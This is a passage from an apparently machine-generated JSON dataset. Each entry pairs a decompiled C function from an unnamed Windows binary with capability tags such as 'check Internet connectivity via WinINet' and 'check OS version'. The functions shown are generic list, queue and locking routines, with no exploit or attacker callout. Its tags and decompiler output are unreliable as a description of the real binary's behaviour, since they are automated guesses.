        "decompiled_code": "\nint32_t __cdecl fcn.00069f20(int32_t arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    var_4h = fcn.00035200(0x14);\n    if (var_4h == NULL) {\n        var_10h = 0x21590004;\n    }\n    else {\n        *var_4h = 0;\n        var_4h[1] = 0;\n        var_4h[2] = 0;\n        var_4h[3] = 0;\n        var_4h[4] = 0;\n        var_10h = fcn.0006a1a0(arg_8h, var_4h + 2, &var_ch);\n        if (var_10h == 0) {\n            fcn.00036c40(arg_8h + 0x1c);\n            do {\n                uVar1 = fcn.000785f8();\n                var_4h[1] = uVar1;\n                for (var_8h = *(arg_8h + 0x18); (var_8h != NULL && (var_4h[1] != var_8h[1])); var_8h = *var_8h) {\n                }\n            } while (var_8h != NULL);\n            *var_4h = *(arg_8h + 0x18);\n            *(arg_8h + 0x18) = var_4h;\n            *arg_ch = var_4h[2];\n            *arg_10h = var_4h[1];\n            fcn.00036cd0(arg_8h + 0x1c);\n            if (var_ch == 0) {\n                var_10h = 0;\n            }\n            else {\n                var_10h = fcn.000760f0(*arg_ch, 0);\n                if (var_10h != 0) {\n                    fcn.0006a0d0(arg_8h, *arg_10h, 0);\n                    *arg_ch = 0;\n                    *arg_10h = 0;\n                }\n            }\n        }\n        else {\n            fcn.00035330(var_4h);\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 549
    },
    "0006a060": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006a060(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint var_8h;\n    uint *var_4h;\n    \n    var_8h = 0;\n    fcn.00036ab0(arg_8h + 0x1c);\n    for (var_4h = *(arg_8h + 0x18); (var_4h != NULL && (var_4h[1] != arg_ch)); var_4h = *var_4h) {\n    }\n    if (var_4h != NULL) {\n        var_8h = var_4h[2];\n    }\n    fcn.00036b60(arg_8h + 0x1c);\n    return var_8h;\n}\n",
        "token_count": 176
    },
    "0006a0d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006a0d0(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uint *var_ch;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    fcn.00036c40(arg_8h + 0x1c);\n    var_8h = NULL;\n    for (var_ch = *(arg_8h + 0x18); (var_ch != NULL && (var_ch[1] != arg_ch)); var_ch = *var_ch) {\n        var_8h = var_ch;\n    }\n    if (var_ch != NULL) {\n        if (var_8h == NULL) {\n            *(arg_8h + 0x18) = *var_ch;\n        }\n        else {\n            *var_8h = *var_ch;\n        }\n        if (var_ch[3] != 0) {\n            fcn.00076610(var_ch[2], var_ch[3]);\n        }\n        var_4h = var_ch[2];\n        fcn.00035330(var_ch);\n    }\n    fcn.00036cd0(arg_8h + 0x1c);\n    if (var_4h != 0) {\n        fcn.0006a3f0(arg_8h, &var_4h, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 319
    },
    "0006a1a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006a1a0(int32_t arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_10h != NULL) {\n        *arg_10h = 0;\n    }\n    fcn.00034550(arg_8h + 0x44);\n    if (*(arg_8h + 0x15c) == 0) {\n        if (*(arg_8h + 0x154) == *(arg_8h + 0x158)) {\n            var_8h = *(arg_8h + 0x34);\n            var_4h = 0;\n            var_10h = fcn.00075a40(arg_ch, &var_8h, 0, 0, *(arg_8h + 0x30), *(arg_8h + 0x38), *(arg_8h + 0x3c));\n            if (var_10h == 0) {\n                for (var_ch = *(arg_8h + 0x40); var_ch != NULL; var_ch = *var_ch) {\n                    if (var_ch[1] == 0) {\n                        var_10h = fcn.00076270(*arg_ch, var_ch + 5, var_ch[4]);\n                        if (var_10h != 0) {\n                            fcn.00075d60(arg_ch, 0);\n                            goto code_r0x0006a39d;\n                        }\n                    }\n                    else {\n                        fcn.000766a0(*arg_ch, var_ch[2], var_ch + 5, var_ch[3], var_ch[4]);\n                    }\n                }\n                var_10h = 0;\n            }\ncode_r0x0006a39d:\n            fcn.000345c0(arg_8h + 0x44);\n            if (var_10h == 0) {\n                if (arg_10h == NULL) {\n                    var_10h = fcn.000760f0(*arg_ch, 0);\n                    if (var_10h != 0) {\n                        fcn.00075d60(arg_ch, 0);\n                    }\n                }\n                else {\n                    *arg_10h = 1;\n                }\n            }\n        }\n        else {\n            uVar1 = *(arg_8h + 0x158) & 0x8000001f;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xffffffe0) + 1;\n            }\n            *(arg_8h + 0x158) = uVar1;\n            *arg_ch = *(arg_8h + 0x54 + *(arg_8h + 0x158) * 8);\n            *(arg_8h + 0x54 + *(arg_8h + 0x158) * 8) = 0;\n            *(arg_8h + 0x58 + *(arg_8h + 0x158) * 8) = 0xffffffff;\n            uVar1 = *(arg_8h + 0x158) + 1U & 0x8000001f;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xffffffe0) + 1;\n            }\n            *(arg_8h + 0x158) = uVar1;\n            fcn.000345c0(arg_8h + 0x44);\n            var_10h = 0;\n        }\n    }\n    else {\n        if (*(arg_8h + 0x164) == 0) {\n            if (*(arg_8h + 0x160) == 0) {\n                var_10h = 0x21590003;\n            }\n            else {\n                *arg_ch = *(arg_8h + 0x160);\n                *(arg_8h + 0x164) = 1;\n                var_10h = 0;\n            }\n        }\n        else {\n            var_10h = 0x21590064;\n        }\n        fcn.000345c0(arg_8h + 0x44);\n    }\n    return var_10h;\n}\n",
        "token_count": 978
    },
    "0006a3f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006a3f0(int32_t arg_8h, uint *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    if (arg_10h == 0) {\n        fcn.00075d60(arg_ch, 0);\n        if (*(arg_8h + 0x15c) != 0) {\n            *(arg_8h + 0x160) = 0;\n            *(arg_8h + 0x164) = 0;\n        }\n    }\n    else {\n        fcn.00034550(arg_8h + 0x44);\n        if (*(arg_8h + 0x15c) == 0) {\n            uVar1 = *(arg_8h + 0x154) + 1U & 0x8000001f;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xffffffe0) + 1;\n            }\n            if (uVar1 == *(arg_8h + 0x158)) {\n                fcn.00075d60(arg_ch, 0);\n            }\n            else {\n                *(arg_8h + 0x54 + *(arg_8h + 0x154) * 8) = *arg_ch;\n                uVar2 = fcn.0006be20();\n                *(arg_8h + 0x58 + *(arg_8h + 0x154) * 8) = uVar2;\n                *(arg_8h + 0x154) = uVar1;\n                *arg_ch = 0;\n            }\n        }\n        else {\n            *(arg_8h + 0x164) = 0;\n            *arg_ch = 0;\n        }\n        fcn.000345c0(arg_8h + 0x44);\n    }\n    return;\n}\n",
        "token_count": 439
    },
    "0006a630": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0006a630(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    fcn.00036ab0(arg_8h + 0x1c);\n    for (var_8h = *(arg_8h + 0x18); (var_8h != NULL && (var_8h[1] != arg_ch)); var_8h = *var_8h) {\n    }\n    if (var_8h != NULL) {\n        var_8h[3] = arg_10h;\n        var_8h[4] = arg_14h;\n    }\n    fcn.00036b60(arg_8h + 0x1c);\n    return var_8h != NULL;\n}\n",
        "token_count": 196
    },
    "0006a6b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0006a6b0(int32_t arg_8h, int32_t arg_ch, uint *arg_10h, uint *arg_14h, uint *arg_18h)\n\n{\n    bool bVar1;\n    uint var_8h;\n    uint *var_4h;\n    \n    bVar1 = false;\n    fcn.00036ab0(arg_8h + 0x1c);\n    for (var_4h = *(arg_8h + 0x18); (var_4h != NULL && (var_4h[1] != arg_ch)); var_4h = *var_4h) {\n    }\n    if (var_4h != NULL) {\n        *arg_10h = var_4h[3];\n        *arg_14h = var_4h[4];\n        *arg_18h = var_4h[2];\n        bVar1 = var_4h[3] != 0;\n        var_4h[3] = 0;\n        var_4h[4] = 0;\n    }\n    fcn.00036b60(arg_8h + 0x1c);\n    return bVar1;\n}\n",
        "token_count": 271
    },
    "0006a750": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006a750(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = fcn.00035200(0x150);\n    if (arg_8h_00 == 0) {\n        iVar1 = 0x21590004;\n    }\n    else {\n        fcn.00078790(arg_8h_00, 0, 0x150);\n        *(arg_8h_00 + 4) = 0xb1c37950;\n        *(arg_8h_00 + 8) = 0xb1c37870;\n        *(arg_8h_00 + 0xc) = 0xb1c37a50;\n        *(arg_8h_00 + 0x10) = 0xb1c37b30;\n        var_ch = arg_ch;\n        var_8h = 0;\n        var_10h = (arg_18h & 1) != 0;\n        iVar1 = fcn.00075a40(arg_8h_00 + 0x14, &var_ch, arg_10h, arg_14h, 0, 0, var_10h);\n        if (iVar1 == 0) {\n            fcn.000344f0(arg_8h_00 + 0x18);\n            fcn.000344f0(arg_8h_00 + 0x130);\n            for (var_4h = 0; var_4h < 0xb; var_4h = var_4h + 1) {\n                *(arg_8h_00 + 0x38 + var_4h * 0x18) = arg_8h_00;\n            }\n            *arg_8h = arg_8h_00;\n            iVar1 = 0;\n        }\n        else {\n            fcn.00035330(arg_8h_00);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 521
    },
    "0006abc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006abc0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if (arg_ch != 0) {\n        fcn.00076610(*(*(arg_8h + 4) + 0xc), arg_ch + -0xc);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "0006abf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0006abf0(int32_t arg_8h, int32_t *arg_ch, uint32_t *arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (*(*(*(arg_8h + 4) + 0x10) + 0x24) == 0) {\n        if (*(arg_8h + 8) == 0) {\n            var_4h = 0x21590001;\n        }\n        else if (*(arg_8h + 0x10) == 0) {\n            while (var_4h = fcn.000763f0(*(*(arg_8h + 4) + 0xc), arg_ch, arg_10h, arg_14h, 1),  var_4h == 0) {\n                if (*arg_10h < 0xc) {\n                    fcn.00076610(*(*(arg_8h + 4) + 0xc), *arg_ch);\n                    *arg_ch = 0;\n                    *arg_10h = 0;\n                    *(arg_8h + 0x10) = 1;\n                    *(arg_8h + 0x14) = 0x2159000a;\n                    return *(arg_8h + 0x14);\n                }\n                puVar1 = *arg_ch;\n                var_10h = *puVar1;\n                var_ch = puVar1[1];\n                var_8h = puVar1[2];\n                fcn.00068fc0(&var_10h);\n                if (var_8h != '\\x06') {\n                    if (var_8h != '\\x03') {\n                        fcn.00076610(*(*(arg_8h + 4) + 0xc), *arg_ch);\n                        *arg_ch = 0;\n                        *arg_10h = 0;\n                        if (var_8h == '\\x04') {\n                            *(arg_8h + 0x10) = 1;\n                            *(arg_8h + 0x14) = 0x21590006;\n                        }\n                        else {\n                            *(arg_8h + 0x10) = 1;\n                            *(arg_8h + 0x14) = 0x2159000a;\n                        }\n                        return *(arg_8h + 0x14);\n                    }\n                    *arg_10h = *arg_10h - 0xc;\n                    if (*arg_10h < 1) {\n                        fcn.00076610(*(*(arg_8h + 4) + 0xc), *arg_ch);\n                        *arg_ch = 0;\n                        *arg_10h = 0;\n                    }\n                    else {\n                        *arg_ch = *arg_ch + 0xc;\n                    }\n                    return 0;\n                }\n                var_10h = *(*(arg_8h + 4) + 0xc);\n                fcn.00076610(var_10h, *arg_ch);\n            }\n            if (var_4h == 0x21590003) {\n                var_4h = 0x21590006;\n            }\n            if (var_4h != 0x21590002) {\n                *(arg_8h + 0x10) = 1;\n                *(arg_8h + 0x14) = var_4h;\n            }\n        }\n        else {\n            var_4h = *(arg_8h + 0x14);\n        }\n    }\n    else {\n        var_4h = 0x21590006;\n    }\n    return var_4h;\n}\n",
        "token_count": 874
    },
    "0006ae30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0006ae30(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = arg_8h;\n    var_ch = 0;\n    if ((*(arg_8h[4] + 0x138) != 0) &&\n       (var_18h = (**(arg_8h[4] + 0x138))(*(arg_8h[4] + 0x20), arg_8h + 5),  var_18h != 0)) {\n        *var_10h = 3;\n        if (*(var_10h[4] + 0x134) != 0) {\n            (**(var_10h[4] + 0x134))(var_10h[5], var_18h, 4);\n        }\n        return 0;\n    }\n    var_10h[3] = 0;\n    do {\n        if (var_10h[3] == 0) {\n            while( true ) {\n                *var_10h = 1;\n                fcn.00034550(var_10h[4] + 0x18);\n                if (*(var_10h[4] + 0x24) != 0) break;\n                var_18h = fcn.00075e70(*(var_10h[4] + 0x14), var_10h + 3, 0);\n                var_ch = var_10h[4] + 0x18;\n                fcn.000345c0(var_ch);\n                if (var_18h == 0) goto code_r0x0006af90;\n                *var_10h = 3;\n                if ((*(var_10h[4] + 0x24) == 0) && (*(var_10h[4] + 0x134) != 0)) {\n                    (**(var_10h[4] + 0x134))(var_10h[5], var_18h, 0);\n                }\n                if (*(var_10h[4] + 0x24) != 0) goto code_r0x0006af90;\n                var_10h = 0xa;\n                var_14h = 0x6af87;\n                fcn.000209a0(10);\n            }\n            var_ch = var_10h[4] + 0x18;\n            fcn.000345c0(var_ch);\ncode_r0x0006af90:\n            if (*(var_10h[4] + 0x24) != 0) {\n                var_10h = NULL;\n                var_14h = 0xc;\n                var_18h = 0x6afaa;\n                fcn.00075d60(0xc, 0);\n                if (*(*(var_10h + 0x10) + 0x13c) == 0) {\n                    return 0;\n                }\n                var_18h = *(var_10h + 0x14);\n                var_1ch = *(*(var_10h + 0x10) + 0x20);\n                var_20h = 0x6b167;\n                (**(*(var_10h + 0x10) + 0x13c))();\n                return 0;\n            }\n            var_20h = var_10h[4] + 0x130;\n            var_14h = 0x6afc0;\n            fcn.00034550(var_20h);\n            *var_10h = 2;\n            var_14h = 0;\n            var_ch = 0;\n            var_4h = -1;\n            for (var_8h = 0; var_8h < 0xb; var_8h = var_8h + 1) {\n                if (*(var_10h[4] + 0x28 + var_8h * 0x18) == 1) {\n                    var_ch = var_ch + 1;\n                }\n                else if ((*(var_10h[4] + 0x28 + var_8h * 0x18) == 0) && (var_14h = var_14h + 1,  var_4h == -1)) {\n                    var_4h = var_8h;\n                }\n            }\n            if ((var_ch == 0) && (var_4h != -1)) {\n                var_14h = 0;\n                var_18h = var_10h[4] + 0x28 + var_4h * 0x18;\n                var_1ch = 0xb1c37e30;\n                var_20h = var_10h[4] + 0x2c + var_4h * 0x18;\n                var_24h = 0x6b078;\n                iVar1 = fcn.0001a8e0(var_20h, 0xb1c37e30, var_18h);\n                if (iVar1 == 0) {\n                    *(var_10h[4] + 0x28 + var_4h * 0x18) = 1;\n                    var_ch = var_ch + 1;\n                }\n            }\n            var_24h = var_10h[4] + 0x130;\n            fcn.000345c0(var_24h);\n        }\n        if (var_ch == 0) {\n            var_1ch = CONCAT31(var_1ch._1_3_, 5);\n            var_20h = 0x21590007;\n            fcn.00068fc0(&fcn.0006ae30::var_24h);\n            fcn.00076330(var_10h[3], &fcn.0006ae30::var_24h, 0xc, 0);\n            fcn.00075d60(var_10h + 3, 0);\n            if (*(var_10h[4] + 0x134) != 0) {\n                (**(var_10h[4] + 0x134))(var_10h[5], 0x21590007, 3);\n            }\n        }\n        else {\n            var_18h = fcn.0006b170(var_10h);\n            if (var_18h != 0) {\n                fcn.00075d60(var_10h + 3, 0);\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 1633
    },
    "0006b170": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0006b170(int32_t arg_8h)\n\n{\n    uint *var_120h;\n    uint var_11ch;\n    int32_t var_118h;\n    uint var_114h;\n    int32_t var_110h;\n    uint32_t var_10ch;\n    uint var_108h;\n    int32_t var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint *var_4ch;\n    int32_t *var_48h;\n    uint var_44h;\n    uint *var_40h;\n    uint var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_38h = 0;\n    var_8h = 0;\n    fcn.00078790(&var_108h, 0, 0xcc);\n    var_108h = 0xb1c4624c;\n    var_110h = fcn.000763f0(*(arg_8h + 0xc), &var_120h, &var_10ch, 600000, 1);\n    if (var_110h == 0) {\n        if (var_10ch < 0xc) {\n            var_110h = 0x2159000a;\n            if ((*(*(arg_8h + 0x10) + 0x24) == 0) && (*(*(arg_8h + 0x10) + 0x134) != 0)) {\n                (**(*(arg_8h + 0x10) + 0x134))(*(arg_8h + 0x14), 0x2159000a, 5);\n            }\n        }\n        else {\n            var_11ch = *var_120h;\n            var_118h = var_120h[1];\n            var_114h = var_120h[2];\n            fcn.00068fc0(&var_11ch);\n            if ((var_114h == '\\0') || (var_114h == '\\x01')) {\n                var_104h = arg_8h;\n                var_fch = var_11ch;\n                if (var_114h != '\\x01') {\n                    var_100h = 1;\n                }\n                var_40h = var_120h;\n                if (*(*(arg_8h + 0x10) + 0x148) == 0) {\n                    var_110h = fcn.000766a0(*(arg_8h + 0xc), 9, 0, 0, 0);\n                    if (var_110h == 0) {\n                        var_8h = 1;\n                        var_4h = 0;\n                    }\n                    else {\n                        var_4h = var_110h;\n                        if (*(*(arg_8h + 0x10) + 0x14c) == 0) {\n                            var_8h = 0;\n                            var_4h = 0;\n                        }\n                    }\n                }\n                else {\n                    var_8h = 0;\n                    var_4h = 0;\n                }\n                if ((var_4h == 0) &&\n                   (var_4h = (**(*(arg_8h + 0x10) + 0x1c))\n                                       (&var_108h, var_118h, var_120h + 3, var_10ch - 0xc, &var_38h, &var_ch, \n                                        *(*(arg_8h + 0x10) + 0x20)),  var_8h != 0)) {\n                    var_110h = fcn.000766a0(*(arg_8h + 0xc), 10, 0, 0, 0);\n                }\n                do {\n                    var_110h = fcn.000763f0(*(arg_8h + 0xc), &var_10h, &var_14h, 0, 0);\n                    if (var_110h != 0) break;\n                    fcn.00076610(*(arg_8h + 0xc), var_10h);\n                } while (0 < var_14h);\n                if (var_110h == 0x21590002) {\n                    var_11ch = var_fch;\n                    var_118h = var_4h;\n                    var_114h = 2;\n                    fcn.00068fc0(&var_11ch);\n                    var_28h = 0;\n                    var_24h = 0;\n                    var_18h = 0;\n                    var_2ch = 0xc;\n                    var_30h = &var_11ch;\n                    if (var_4ch == NULL) {\n                        var_34h = &var_24h;\n                    }\n                    else {\n                        var_34h = var_4ch;\n                        *var_48h = &var_24h;\n                    }\n                    var_1ch = var_ch;\n                    var_20h = var_38h;\n                    var_110h = fcn.00076840(*(arg_8h + 0xc), &var_34h, 0);\n                }\n                if (var_110h == 0x21590003) {\n                    var_110h = 0x21590006;\n                }\n                if (var_110h == 0) {\n                    if (*(*(arg_8h + 0x10) + 0x144) != 0) {\n                        (**(*(arg_8h + 0x10) + 0x144))(*(arg_8h + 0x14), var_44h, var_4h, var_38h, var_ch);\n                    }\n                }\n                else {\n                    if ((*(*(arg_8h + 0x10) + 0x24) == 0) && (*(*(arg_8h + 0x10) + 0x134) != 0)) {\n                        (**(*(arg_8h + 0x10) + 0x134))(*(arg_8h + 0x14), var_110h, 2);\n                    }\n                    if (*(*(arg_8h + 0x10) + 0x140) != 0) {\n                        (**(*(arg_8h + 0x10) + 0x140))(*(arg_8h + 0x14), var_44h, var_4h, var_38h, var_ch);\n                    }\n                }\n                fcn.0006b730(&var_108h);\n            }\n            else {\n                var_110h = 0x2159000a;\n                if ((*(*(arg_8h + 0x10) + 0x24) == 0) && (*(*(arg_8h + 0x10) + 0x134) != 0)) {\n                    (**(*(arg_8h + 0x10) + 0x134))(*(arg_8h + 0x14), 0x2159000a, 5);\n                }\n            }\n        }\n        fcn.00035330(var_38h);\n        fcn.00035330(var_44h);\n        if (*(arg_8h + 0xc) != 0) {\n            fcn.00076610(*(arg_8h + 0xc), var_120h);\n        }\n    }\n    else if ((((var_110h != 0x21590003) && (var_110h != 0x21590002)) && (*(*(arg_8h + 0x10) + 0x24) == 0)) &&\n            (*(*(arg_8h + 0x10) + 0x134) != 0)) {\n        (**(*(arg_8h + 0x10) + 0x134))(*(arg_8h + 0x14), var_110h, 1);\n    }\n    return var_110h;\n}\n",
        "token_count": 1854
    },
    "0006b630": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0006b630(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(arg_8h + 0xb8) < 10) {\n        iVar2 = fcn.00035200(arg_ch);\n        if (iVar2 == 0) {\n            piVar1 = NULL;\n        }\n        else {\n            piVar1 = arg_8h + 0x18 + *(arg_8h + 0xb8) * 0x10;\n            *(arg_8h + 0xb8) = *(arg_8h + 0xb8) + 1;\n            if (arg_10h == 0) {\n                *piVar1 = *(arg_8h + 0xbc);\n                *(arg_8h + 0xbc) = piVar1;\n                if (*piVar1 == 0) {\n                    *(arg_8h + 0xc0) = piVar1;\n                }\n            }\n            else if (*(arg_8h + 0xc0) == 0) {\n                *(arg_8h + 0xbc) = piVar1;\n                *(arg_8h + 0xc0) = piVar1;\n            }\n            else {\n                **(arg_8h + 0xc0) = piVar1;\n                *(arg_8h + 0xc0) = piVar1;\n            }\n            piVar1[1] = iVar2;\n            piVar1[2] = arg_ch;\n        }\n    }\n    else {\n        piVar1 = NULL;\n    }\n    return piVar1;\n}\n",
        "token_count": 396
    },
    "0006b780": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006b780(int32_t arg_8h, uint arg_ch)\n\n{\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(*(arg_8h + 4) + 0x10) + 0x24) == 0) {\n        if (*(arg_8h + 8) == 0) {\n            var_14h = 0x21590001;\n        }\n        else if (*(arg_8h + 0x10) == 0) {\n            var_1ch = 0;\n            var_20h = *(arg_8h + 0xc);\n            var_18h = 3;\n            fcn.00068fc0(&var_20h);\n            var_4h = 0;\n            var_8h = 0xc;\n            var_ch = &var_20h;\n            var_10h = arg_ch;\n            var_14h = fcn.00076840(*(*(arg_8h + 4) + 0xc), &var_10h, 0);\n            if (var_14h == 0x21590003) {\n                var_14h = 0x21590006;\n            }\n        }\n        else {\n            var_14h = *(arg_8h + 0x14);\n        }\n    }\n    else {\n        var_14h = 0x21590006;\n    }\n    return var_14h;\n}\n",
        "token_count": 369
    },
    "0006ba30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0006ba30(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    var_4h = arg_8h;\n    var_ch = fcn.000774f0(*arg_8h);\n    while( true ) {\n        do {\n            iVar1 = fcn.000785f8();\n            var_8h = fcn.000776f0(var_4h[1], var_4h[2], &var_14h, &var_10h, iVar1 % 6000 + 2000, 0);\n            if ((var_8h != 0) && (var_4h[3] != 0)) {\n                var_8h = 0x21590006;\n            }\n        } while (var_8h == 0x21590002);\n        if (var_8h != 0) break;\n        var_8h = (**(var_ch + 0xc))(*var_4h, var_14h, var_10h, 0);\n        fcn.000779e0(var_4h[1], var_14h);\n        if (var_8h != 0) {\ncode_r0x0006bb03:\n            var_4h[3] = 1;\n            return 0;\n        }\n    }\n    if ((var_8h != 0x21590006) && (var_4h[3] == 0)) {\n        fcn.00077a60(var_4h[1], var_4h[2]);\n    }\n    goto code_r0x0006bb03;\n}\n",
        "token_count": 475
    },
    "0006bb20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
